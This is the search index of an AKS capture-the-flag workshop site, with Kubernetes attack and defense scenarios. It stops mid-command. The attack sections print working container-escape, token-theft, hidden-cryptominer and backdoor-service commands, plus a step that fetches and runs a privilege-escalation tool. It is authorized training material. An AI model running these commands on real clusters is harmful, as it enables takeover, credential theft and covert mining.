{"config":{"lang":["en"],"separator":"[\\s\\-\\.]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"AKS CTF","text":"<p>Welcome to the Attacking and Defending Azure Kubernetes Service Clusters.  This is inspired by Secure Kubernetes, as presented at KubeCon NA 2019. We'll help you create your own AKS so you can follow along as we take on the role of two attacking personas looking to make some money and one defending persona working hard to keep the cluster safe and healthy.</p>"},{"location":"#getting-started","title":"Getting Started","text":"<p>Click on \"Getting Started\" in the table of contents and follow the directions.</p> <p>When a kubectl get pods --all-namespaces gives output like the following, you're ready to begin the tutorial.</p> <pre><code>$ kubectl get pods --all-namespaces\nNAMESPACE     NAME                                         READY   STATUS    RESTARTS   AGE\ndev           app-6ffb94966d-9nqnk                         1/1     Running   0          70s\ndev           dashboard-5889b89d4-dj7kq                    2/2     Running   0          70s\ndev           db-649646fdfc-kzp6g                          1/1     Running   0          70s\n...\nprd           app-6ffb94966d-nfhn7                         1/1     Running   0          70s\nprd           dashboard-7b5fbbc459-sm2zk                   2/2     Running   0          70s\nprd           db-649646fdfc-vdwj6                          1/1     Running   0          70s\n</code></pre>"},{"location":"#about-the-creators","title":"About the Creators","text":"<ul> <li>@lastcoolname is a Partner Solution Architect as Microsoft and has supported the Azure partner ecosystem enable and secure their Docker and Kubernetes deployments since joining Microsoft in 2007.</li> <li>@tabbysable has been a hacker and cross-platform sysadmin since the turn of the century. She can often be found teaching network offense and defense to sysadmins, system administration to security folks, bicycling, and asking questions that start with \"I wonder what happens if we...\"</li> <li>@petermbenjamin is a Senior Software Engineer with a background in Information Security and a co-organizer for the San Diego Kubernetes and Go meet-ups. He has a passion for enabling engineers to build secure and scalable applications, services, and platforms on modern distributed systems.</li> <li>@jimmesta is a security leader that has been working in AppSec and Infrastructure Security for over 10 years. He founded and led the OWASP Santa Barbara chapter and co-organized the AppSec California security conference. Jimmy has taught at private corporate events and security conferences worldwide including AppSec USA, LocoMocoSec, SecAppDev, RSA, and B-Sides. He has spent significant time on both the offense and defense side of the industry and is constantly working towards building modern, developer-friendly security solutions.</li> <li>@BradGeesaman is an Independent Security Consultant helping clients improve the security of their Kubernetes clusters and supporting cloud environments. He has recently spoken at KubeCon NA 2017 on Kubernetes security and has over 5 years of experience building, designing, and delivering ethical hacking educational training scenarios.</li> </ul>"},{"location":"azure/","title":"Getting Started","text":"<ol> <li> <p>Create a new Azure account or choose an existing one, as you prefer.</p> </li> <li> <p>Open a new tab to Azure Cloud Shell.  You can click here.</p> </li> <li> <p>Clone the repo: <code>git clone https://github.com/lastcoolnameleft/aks-ctf.git &amp;&amp; cd aks-ctf/workshop</code></p> </li> <li> <p>Once inside the Cloud Shell terminal, run setup.sh. This should create a new Project with a single-node Kubernetes cluster that contains the prerequisites for the workshop:     <pre><code>./setup.sh\n</code></pre></p> </li> </ol> <p>The script will prompt you for a project name (just hit enter to accept the default) and a password for your webshell instances.</p> <ol> <li>When the script is finished, verify it worked correctly.</li> </ol> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>The output should look similar to this: <pre><code>$ kubectl get pods --all-namespaces\nNAMESPACE     NAME                                         READY   STATUS    RESTARTS   AGE\ndev           app-6ffb94966d-9nqnk                         1/1     Running   0          70s\ndev           dashboard-5889b89d4-dj7kq                    2/2     Running   0          70s\ndev           db-649646fdfc-kzp6g                          1/1     Running   0          70s\n...\nprd           app-6ffb94966d-nfhn7                         1/1     Running   0          70s\nprd           dashboard-7b5fbbc459-sm2zk                   2/2     Running   0          70s\nprd           db-649646fdfc-vdwj6                          1/1     Running   0          70s\n</code></pre></p> <p>If it looks good, move on to Scenario 1 Attack.</p>"},{"location":"bonus_1_walkthrough/","title":"Bonus Walkthroughs","text":""},{"location":"bonus_1_walkthrough/#challenge-1","title":"Challenge 1","text":"<p>Get a root shell on the <code>cluster</code> <code>node</code> again. Find out the image name that was last run directly with docker commands by the <code>kubernetes</code> user.</p> <ol> <li> <p>Create a \"hostpath volume mount\" <code>pod</code> manifest.</p> <pre><code>cat &gt; hostpath.yml &lt;&lt;EOF\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: hostpath\nspec:\n  containers:\n  - name: hostpath\n    image: busybox:latest\n    command:\n      - sleep\n      - \"86400\"\n    volumeMounts:\n      - name: rootfs\n        mountPath: /rootfs\n  restartPolicy: Always\n  volumes:\n    - name: rootfs\n      hostPath:\n        path: /\nEOF\n</code></pre> </li> <li> <p>Create the <code>pod</code> that mounts the host filesystem's <code>/</code> at <code>/rootfs</code> inside the container.</p> <pre><code>kubectl apply -f hostpath.yml\n</code></pre> </li> <li> <p>Use <code>kubectl exec</code> to get a shell inside the <code>hostpath</code> <code>pod</code> in the <code>default</code> <code>namespace</code>.</p> <pre><code>kubectl exec -it hostpath /bin/sh\n</code></pre> </li> <li> <p>Use the <code>chroot</code> command to switch the filesystem root to the <code>/rootfs</code> of the container and run a <code>bash</code> shell.</p> <pre><code>chroot /rootfs /bin/bash\n</code></pre> </li> <li> <p>Navigate to the home directory of the <code>kubernetes</code> user on the host filesystem, and examine the shell history for the image that was run manually with a <code>docker run</code> invocation.</p> <pre><code>cd /home/kubernetes\nls\n</code></pre> <pre><code>cat .bash_history\n</code></pre> </li> <li> <p>Exit from the <code>chroot</code> shell.</p> <p><pre><code>exit\n</code></pre> 1. Exit from the <code>kubectl exec</code> into the <code>pod</code>.</p> <pre><code>exit\n</code></pre> </li> <li> <p>Clean up after our <code>pod</code> escape.</p> <pre><code>kubectl delete -f hostpath.yml\n</code></pre> </li> </ol>"},{"location":"bonus_2_walkthrough/","title":"Bonus Walkthroughs","text":""},{"location":"bonus_2_walkthrough/#challenge-2","title":"Challenge 2","text":"<p>Was this cluster compromised via another mechanism and Blue didn't know about it?  (Yes!) Find the IP address of the attacker's system where the reverse shell was being sent.  Hint: Tiller was removed with <code>helm reset --force</code> and so it left some things behind in the <code>kube-system</code> <code>namespace</code>.</p> <ol> <li> <p>Search for leftover <code>configmaps</code></p> <pre><code>kubectl get configmap --all-namespaces\n</code></pre> </li> <li> <p>Dig into the Helm Chart configmap</p> <pre><code>kubectl get configmap -n kube-system toned-elk.v1 -o json\n</code></pre> <pre><code>kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.'\n</code></pre> <pre><code>kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release'\n</code></pre> <pre><code>kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d\n</code></pre> <pre><code>kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d | file -\n</code></pre> <pre><code>kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d | gunzip -\n</code></pre> </li> <li> <p>Examine the image without running it</p> <pre><code>docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker.io/wagoodman/dive:latest docker.io/bradgeesaman/bd:latest\n</code></pre> </li> <li> <p>Make a tmp space to save the image</p> <pre><code>mkdir ~/bdtmp &amp;&amp; cd ~/bdtmp\n</code></pre> </li> <li> <p>Save the image as a tarball</p> <pre><code>docker save docker.io/bradgeesaman/bd:latest -o bd.tar\n</code></pre> <pre><code>ls -alh\n</code></pre> </li> <li> <p>View the image tarball contents</p> <pre><code>tar tvf bd.tar \n</code></pre> <pre><code>tar xvf bd.tar\n</code></pre> </li> <li> <p>Examine the manifest.json to find the layers</p> <pre><code>cat manifest.json | jq -r '.'\n</code></pre> <pre><code>jq -r '.[].Config' manifest.json\n</code></pre> <pre><code>cat $(jq -r '.[].Config' manifest.json) | jq -r '.'\n</code></pre> <pre><code>cat $(jq -r '.[].Config' manifest.json) | jq -r '.history[] | select(.\"empty_layer\"!=true)'\n</code></pre> <pre><code>ls -alh\n</code></pre> </li> <li> <p>Obtain the last layer file name</p> <pre><code>cat manifest.json | jq -r '.'\n</code></pre> <pre><code>jq -r '.[].Layers[]' manifest.json | tail -1\n</code></pre> </li> <li> <p>To get the answer, view the contents of the last image layer</p> <pre><code>tar xvf $(jq -r '.[].Layers[]' manifest.json | tail -1) -O\n</code></pre> </li> <li> <p>Cleanup</p> <pre><code>cd ..\n</code></pre> <pre><code>rm -rf ~/bdtmp\n</code></pre> </li> </ol>"},{"location":"bonus_challenges/","title":"Bonus Challenges","text":"<p>Blue's boss has hired you to see if the cluster is completely \"clean\".  Use the next block of time to solve the following bonus challenges.  Once you know both answers, approach one of the co-presenters and whisper the answers to both questions to earn the prestigious \"expert\" badge.</p>"},{"location":"bonus_challenges/#challenge-1","title":"Challenge 1","text":"<ul> <li>Get a root shell on the <code>cluster</code> <code>node</code> again. Find out the image name that was last run directly with docker commands by the <code>kubernetes</code> user.</li> </ul>"},{"location":"bonus_challenges/#challenge-2","title":"Challenge 2","text":"<ul> <li>Was this cluster compromised via another mechanism and Blue didn't know about it?  (Yes!) Find the IP address of the attacker's system where the reverse shell was being sent.  Hint: Tiller was removed with <code>helm reset --force</code> and so it left some things behind in the <code>kube-system</code> <code>namespace</code>.</li> </ul>"},{"location":"bonus_hints/","title":"Bonus Hints","text":""},{"location":"bonus_hints/#bonus-1-challenge-hint","title":"Bonus 1 Challenge Hint:","text":"<p>On the host, look at <code>/home/kubernetes/.bash_history</code> bash shell history.</p>"},{"location":"bonus_hints/#bonus-2-challenge-hint","title":"Bonus 2 Challenge Hint:","text":"<p>Review the leftover Helm chart deploy history <code>configmap</code> in the <code>kube-system</code> <code>namespace</code>. Base64 decode and <code>gunzip</code> the contents of the <code>configmap</code> data, and examine the contents of the container image referenced in the <code>deployment</code> manifest.</p>"},{"location":"scenario_1_attack/","title":"Free Compute: Scenario 1 Attack","text":""},{"location":"scenario_1_attack/#warning","title":"Warning","text":"<p>In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.</p> <p>In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.</p>"},{"location":"scenario_1_attack/#backstory","title":"Backstory","text":""},{"location":"scenario_1_attack/#name-red","title":"Name: Red","text":"<ul> <li>Opportunist</li> <li>Easy money via crypto-mining</li> <li>Uses automated scans of web IP space for specific issues</li> <li>Leverages off-the-shelf attacks</li> <li>Basic Kubernetes knowledge</li> </ul>"},{"location":"scenario_1_attack/#motivations","title":"Motivations","text":"<ul> <li>Red\u2019s intrusion-as-a-service provider compromises website and uploads a webshell</li> <li>Red gets the URL of the webshell and wants to deploy some crypto-miners</li> </ul>"},{"location":"scenario_1_attack/#initial-access","title":"Initial Access","text":"<p>Red has been mining <code>bitcoinero</code> for a few months now, and it's starting to gain some value.  To capitalize on this bubble, Red uses a service that sells shell access to expand the mining pool.  To find the compromised website, run the following from your Cloud Shell terminal:</p>"},{"location":"scenario_1_attack/#issue-previous-tool-used-nodeport-instead-of-lb-validate-no-issues-with-lb","title":"ISSUE: Previous tool used NodePort instead of LB.  Validate no issues with LB","text":"<pre><code>./attack-1-helper.sh\n</code></pre> <p>Log into the URL in a browser, and you should be looking at a working web terminal.</p> <p></p>"},{"location":"scenario_1_attack/#thinking-in-graphs","title":"Thinking In Graphs","text":"<p>Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.</p> <p>The general process looks like this:</p> <p></p> <ul> <li> <p>Study</p> <p>In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, <code>nmap</code> is commonly used to enumerate IP networks. <code>nikto</code>, <code>burp</code>, and <code>sqlmap</code> are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as <code>uname</code>, <code>winver</code>, and <code>netstat</code> provide a wealth of information about their host OSes.</p> </li> <li> <p>Plan</p> <p>In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.</p> </li> <li> <p>Attack Something</p> <p>In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.</p> </li> <li> <p>Persist</p> <p>In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.</p> </li> <li> <p>Win</p> <p>Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.</p> </li> </ul>"},{"location":"scenario_1_attack/#getting-some-loot","title":"Getting Some Loot","text":"<p>Since Red already has a shell on a compromised host (Thanks, Natoshi!), the process is fairly simple. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible:</p> <p>Let's become Red and try some basic information-gathering commands to get a feel for the environment:</p> <p><pre><code>id\n</code></pre> <pre><code>uname -a\n</code></pre> <pre><code>cat /etc/lsb-release /etc/redhat-release\n</code></pre> <pre><code>ps -ef\n</code></pre> <pre><code>df -h\n</code></pre> <pre><code>netstat -nl\n</code></pre></p> <p>Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container.</p> <p>Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running a basic Linux config auditor to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel.</p> <p><pre><code>cat /etc/shadow\n</code></pre> <pre><code>ls -l /home\n</code></pre> <pre><code>ls -l /root\n</code></pre> <pre><code>cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard\n</code></pre></p> <p>That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:</p> <pre><code>cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained\n</code></pre> <p>This tells us several things:</p> <ul> <li>We are in a container, and it's managed by Kubernetes</li> <li>Some security features are not in use (userns)</li> <li>Seccomp is disabled, but a number of Syscalls are blocked</li> <li>We don't have any exciting capabilities. Click for more capabilities info.</li> </ul> <p>Now let's inspect our Kubernetes environment:</p> <p><pre><code>env | grep -i kube\n</code></pre> <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount\n</code></pre></p> <p>We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:</p> <p><pre><code>export PATH=/tmp:$PATH\ncd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl\n</code></pre> <pre><code>kubectl get all\n</code></pre> <pre><code>kubectl get all -A\n</code></pre> <pre><code>kubectl get namespaces\n</code></pre></p> <p>By default, kubectl will attempt to use the default service account in <code>/var/run/secrets/kubernetes.io/serviceaccount</code> -- and it looks like this one has some API access. Note that we can't see anything outside our namespace, though.</p> <p>Let's inspect what all we can do:</p> <pre><code>kubectl auth can-i --list\n</code></pre> <p>Can we create pods in this and other namespaces?</p> <pre><code>kubectl auth can-i create pods\nkubectl auth can-i create pods -n dev\nkubectl auth can-i create pods -n prd\nkubectl auth can-i create pods -n kube-system\n</code></pre> <p>Happy day! Our service account is admin in our pod's namespace! Maybe the dashboard on port 31337 needs that much access? Anyway, this gives us what we need to achieve our goals.</p> <pre><code>cd /tmp; cat &gt; bitcoinero.yml &lt;&lt;EOF\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: bitcoinero\n  name: bitcoinero\n  namespace: dev\nspec:\n  replicas: 1\n  revisionHistoryLimit: 2\n  selector:\n    matchLabels:\n      run: bitcoinero\n  strategy:\n    rollingUpdate:\n      maxSurge: 25%\n      maxUnavailable: 25%\n    type: RollingUpdate\n  template:\n    metadata:\n      labels:\n        run: bitcoinero\n    spec:\n      containers:\n      - image: securekubernetes/bitcoinero:latest\n        name: bitcoinero\n        command: [\"./moneymoneymoney\"]\n        args:\n        - -c\n        - \"1\"\n        - -l\n        - \"10\"\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 200m\n            memory: 128Mi \nEOF\n\n./kubectl apply -f bitcoinero.yml\nsleep 10\n./kubectl get pods\n</code></pre> <p>We can see the bitcoinero pod running, starting to generate us a small but steady stream of cryptocurrency.</p> <p>MISSION ACCOMPLISHED</p>"},{"location":"scenario_1_defense/","title":"Free Compute: Scenario 1 Defense","text":""},{"location":"scenario_1_defense/#backstory","title":"Backstory","text":""},{"location":"scenario_1_defense/#name-blue","title":"Name: Blue","text":"<ul> <li>Overworked</li> <li>Can only do the bare minimum</li> <li>Uses defaults when configuring systems</li> <li>Usually gets blamed for stability or security issues</li> </ul>"},{"location":"scenario_1_defense/#motivations","title":"Motivations","text":"<ul> <li>Blue gets paged at 1am with an \u201curgent\u201d problem: the developers say \u201cthe website is slow\u201d</li> <li>Blue reluctantly agrees to take a \u201cquick look\u201d</li> <li>Blue wants desperately to get back to sleep. Zzz</li> </ul>"},{"location":"scenario_1_defense/#defense","title":"Defense","text":"<p>Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming.  It's \"the one running in Kubernetes\", they said.  Blue leverages their Cloud Shell terminal to begin the process of troubleshooting the issue.</p>"},{"location":"scenario_1_defense/#identifying-the-issue","title":"Identifying the Issue","text":"<p>The first step is to determine the name for the web application <code>deployment</code> in question.  From the terminal, Blue runs the following to see a listing of all <code>pods</code> in all <code>namespaces</code>:</p> <pre><code>kubectl get pods --all-namespaces\n</code></pre> <p>The <code>cluster</code> is relatively small in size, but it has a couple <code>deployments</code> that could be the site in question.  The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with:</p> <pre><code>kubectl top node\n</code></pre> <p>and</p> <pre><code>kubectl top pod --all-namespaces\n</code></pre> <p>It appears that a suspcious <code>deployment</code> named <code>bitcoinero</code> is running, and its causing resource contention issues.  Blue runs the following to see the <code>pod's</code> full configuration:</p> <pre><code>kubectl get deployment -n svc bitcoinero -o yaml\n</code></pre> <p>It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website.  Next, Blue grabs a consolidated listing of all images running in the <code>cluster</code>:</p> <pre><code>kubectl get pods --all-namespaces -o jsonpath=\"{..image}\" | tr -s '[[:space:]]' '\\n' | sort -u\n</code></pre>"},{"location":"scenario_1_defense/#confirming-the-foreign-workload","title":"Confirming the Foreign Workload","text":"<p>Blue sends a message back to the developers asking for confirmation of the suspicious <code>bitcoinero</code> image, and they all agree they don't know who created the <code>deployment</code>. They also mention that someone accidentally deployed a <code>LoadBalancer</code> for the dev ops dashboard, and ask if Blue can delete it for them. Blue makes a mental note about the <code>LoadBalancer</code> and then looks at the AKS cluster in the Azure Portal.</p> <p></p>"},{"location":"scenario_1_defense/#issue-how-can-we-determine-in-the-azure-portal-that-it-was-default-service-account","title":"ISSUE: How can we determine in the Azure portal that it was default service account?","text":"<p>Blue sees that the <code>default</code> Kubernetes <code>serviceaccount</code> was the creator of the <code>bitcoinero</code> <code>deployment</code>.</p> <p>Back in the Cloud Shell terminal, Blue runs the following to list the <code>pods</code> running with the <code>default</code> <code>serviceaccount</code> in the <code>dev</code> <code>namespace</code>:</p> <pre><code>kubectl get pods -n dev -o jsonpath='{range .items[?(@.spec.serviceAccountName==\"default\")]}{.metadata.name}{\" \"}{.spec.serviceAccountName}{\"\\n\"}{end}'\n</code></pre>"},{"location":"scenario_1_defense/#cleaning-up","title":"Cleaning Up","text":"<p>Unsure of exactly how a <code>pod</code> created another <code>pod</code>, Blue decides that it's now 3am, and the commands are blurring together.  The website is still slow, so Blue decides to find and delete the <code>deployment</code>:</p> <pre><code>kubectl get deployments -n dev\n</code></pre> <pre><code>kubectl delete deployment bitcoinero -n dev\n</code></pre> <p>They also keep their promise, and delete the <code>LoadBalancer</code>: <pre><code>kubectl get services -n dev\n</code></pre></p> <pre><code>kubectl delete service dashboard -n dev\n</code></pre>"},{"location":"scenario_1_defense/#installing-security-visibility","title":"Installing Security Visibility","text":"<p>It's now very clear to Blue that without additional information, it's difficult to determine exactly who or what created that <code>bitcoinero</code> deployment.  Was it code?  Was it a human?  Blue suspects it was one of the engineers on the team, but there's not much they can do without proof.  Remembering that this <code>cluster</code> doesn't have any runtime behavior monitoring and detection software installed, Blue decides to install Sysdig's Falco using an all-in-one manifest from a prominent blogger.</p> <pre><code>helm repo add falcosecurity https://falcosecurity.github.io/charts\nhelm repo update\nhelm install falco falcosecurity/falco \\\n    --create-namespace \\\n    --namespace falco\n</code></pre> <p>Just to make sure it's working, Blue runs the following command to get the logs from the deployed <code>Falco</code> <code>pod(s)</code>:</p> <pre><code>kubectl logs -n falco $(kubectl get pod -n falco -l app.kubernetes.io/name=falco -o=name) -f\n</code></pre>"},{"location":"scenario_1_defense/#reviewing-the-falco-rules","title":"Reviewing the Falco Rules:","text":"<p>Falco Kubernetes Rules:</p> <pre><code>kubectl get configmaps -n falco falco -o json | jq -r '.data.\"falco.yaml\"'\n</code></pre>"},{"location":"scenario_1_defense/#giving-the-all-clear","title":"Giving the \"All Clear\"","text":"<p>Seeing what looks like a \"happy\" <code>cluster</code>, Blue emails their boss that there was a workload using too many resources that wasn't actually needed, so it was deleted.  Also, they added some additional \"security\" just in case.</p>"},{"location":"scenario_2_attack/","title":"Persistence: Scenario 2 Attack","text":""},{"location":"scenario_2_attack/#backstory","title":"Backstory","text":""},{"location":"scenario_2_attack/#name-darkred","title":"Name: DarkRed","text":"<ul> <li>Highly Skilled</li> <li>Sells Exfiltrated Data for $$</li> <li>Evades detection and employs persistence</li> <li>Uses env-specific tooling</li> <li>Creates bespoke payloads</li> <li>Expert Kubernetes knowledge</li> </ul>"},{"location":"scenario_2_attack/#motivations","title":"Motivations","text":"<ul> <li>Red notices that the website is gone and the cryptominers have stopped reporting in.</li> <li>Red asks DarkRed for help trying to get back into the Kubernetes cluster and gives DarkRed the IP address.</li> <li>Red will split the revenue if DarkRed can get the miners back up and running.</li> </ul>"},{"location":"scenario_2_attack/#initial-foothold","title":"Initial Foothold","text":""},{"location":"scenario_2_attack/#issue-original-ctf-exposed-a-nodeport-instead-of-a-lb-lb-feels-more-natural-but-havent-tested-nmap-with-it-and-doesnt-have-the-same-30k-port-number","title":"ISSUE:  Original CTF exposed a NodePort instead of a LB.  LB feels more natural, but haven't tested nmap with it and doesn't have the same 30k+ port number.","text":"<p>Seeing that the URL included port <code>31337</code> and that Red said it was a Kubernetes <code>cluster</code>, it was likely to be exposed via a <code>LoadBalancer</code> <code>service</code>. With this information, she has a feeling that more <code>services</code> might still be exposed to the web this way. DarkRed starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via <code>nmap</code>.</p> <p>To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to \"nmap -sT -A -T4 -n -v -Pn your-ip-address-goes-here\". Be absolutely sure to scan your assigned IP address.</p> <p>This scan confirms DarkRed's suspicion that more services were present in this <code>cluster</code>. They all look like webservers, so explore them briefly with your browser.</p> <p>DarkRed notices that two of the services look like the company's main product, but the third is a juicy ops dashboard. Her intuition says that the dashboard is probably not maintained as carefully as the real product, and she focuses her attention there. Using tools such as <code>dirb</code>, <code>sqlmap</code>, <code>nikto</code>, and <code>burp</code>, she explores the dashboard, finds a vulnerability in a common web-development library, and exploits it to gain remote code execution on the server. For convenience, DarkRed installs a webshell for further exploration.</p> <p>Now, let's become DarkRed and leverage this new access:</p>"},{"location":"scenario_2_attack/#deploying-miners","title":"Deploying Miners","text":"<p>The webshell can be found at http://your-ip:31336/webshell/, and uses your workshop credentials as before.</p> <p>Run the second attacker script to get this info:</p> <pre><code>./attack-2-helper.sh\n</code></pre> <p>Run a few commands to make sure it's working and gather some basic information:</p> <pre><code>id; uname -a; cat /etc/lsb-release; ps -ef; env | grep -i kube\n</code></pre> <p>Review the information. Check for Kubernetes access, and find the limits of our permissions:</p> <pre><code>export PATH=/tmp:$PATH\ncd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl \nkubectl get pods\nkubectl get pods --all-namespaces\nkubectl get nodes\nkubectl auth can-i --list\nkubectl auth can-i create pods\nkubectl auth can-i create pods -n dev\nkubectl auth can-i create pods -n prd\nkubectl auth can-i create pods -n kube-system\n</code></pre> <p>Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.</p> <p>Using a neat trick from Twitter, let's attempt to deploy a container that gives us full host access:</p> <pre><code>kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"imagePullPolicy\":\"IfNotPresent\",\"securityContext\":{\"privileged\":true}}]}}'\n</code></pre> <p>Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.</p> <p>First we see <code>\"hostPID\": true</code>, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.</p> <p>Next, we use the nsenter command to switch to a different <code>mount</code> namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host <code>mount</code> namespace! The result is similar to doing a <code>HostPath</code> mount and <code>chroot</code>-ing into it, but this works at a lower level, breaking down the <code>mount</code> namespace isolation completely. The <code>privileged</code> security context is necessary to prevent a permissions error accessing <code>/proc/1/ns/mnt</code>.</p> <p>Convince yourself that you're really on the host, using some of our earlier enumeration commands:</p> <pre><code>id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube\n</code></pre> <p>It's been said that \"if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong\", so it's unlikely that cluster administrators are SSHing into nodes and running commands directly.  </p> <p>AKS doesn't use Docker, so instead we'll need to use <code>crictl</code> instead.  By deploying our bitcoinero container via Docker on the host, it will show up in a <code>crictl ps</code> listing.  However, containerd is managing the container directly and not the <code>kubelet</code>, so the malicious container won't show up in a <code>kubectl get pods</code> listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.</p> <p>First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.  For this, we will use <code>ctr</code>, the containerd CLI.</p> <pre><code>ctr containers ls\n</code></pre> <pre><code># ctr does not auto-pull images\nctr images pull docker.io/securekubernetes/bitcoinero:latest\n\nctr run -d docker.io/securekubernetes/bitcoinero:latest bitcoinero \"/moneymoneymoney\" \"-c 1 -l 10\"\n</code></pre> <pre><code># Verify the container is running\nctr container ls\n\n# Verify the container doesn't show up in the pod list\nkubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A\n</code></pre>"},{"location":"scenario_2_attack/#digging-in","title":"Digging In","text":"<p>Now that DarkRed has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for \"safekeeping\".</p> <p>It would be nice to leave a backdoor for future access. Let's become DarkRed again and see what we can do:</p> <p>First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions:</p> <pre><code>ps -ef | grep kubelet\n</code></pre> <p>Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig</p> <pre><code>kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system\n</code></pre> <p>Looks good! Let's try it:</p> <pre><code>kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo \"success\"\n</code></pre> <p>Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API.</p> <pre><code>TOKEN=$(for i in `mount | sed -n '/secret/ s/^tmpfs on \\(.*default.*\\) type tmpfs.*$/\\1\\/namespace/p'`; do if [ `cat $i` = 'kube-system' ]; then cat `echo $i | sed 's/.namespace$/\\/token/'`; break; fi; done)\necho -e \"\\n\\nYou'll want to copy this for later:\\n\\nTOKEN=\\\"$TOKEN\\\"\"\n</code></pre> <p><pre><code>kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces\n</code></pre> Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future:</p> <pre><code>cat &lt;&lt;EOF | kubectl --kubeconfig /var/lib/kubelet/kubeconfig apply -f -\napiVersion: v1\nkind: Service\nmetadata:\n  name: istio-mgmt\nspec:\n  type: LoadBalancer\n  ports:\n    - protocol: TCP\n      port: 31313\n      targetPort: $KUBERNETES_SERVICE_PORT\n---\napiVersion: v1\nkind: Endpoints\nmetadata:\n  name: istio-mgmt\nsubsets:\n  - addresses:\n      - ip: `sed -n 's/^  *server: https:\\/\\///p' /var/lib/kubelet/kubeconfig`\n    ports:\n      - port: $KUBERNETES_SERVICE_PORT\nEOF\n</code></pre> <p>Press control-d to exit (and delete) the <code>r00t</code> pod.</p> <p>If you like, you may validate that external access is working, using cloud shell:</p> <pre><code>if [ -z \"$TOKEN\" ]; then\n  echo -e \"\\n\\nPlease paste in the TOKEN=\\\"...\\\" line and try again.\"\nelse\n  EXTERNAL_IP=`gcloud compute instances list --format json | jq '.[0][\"networkInterfaces\"][0][\"accessConfigs\"][0][\"natIP\"]' | sed 's/\"//g'`\n  kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server 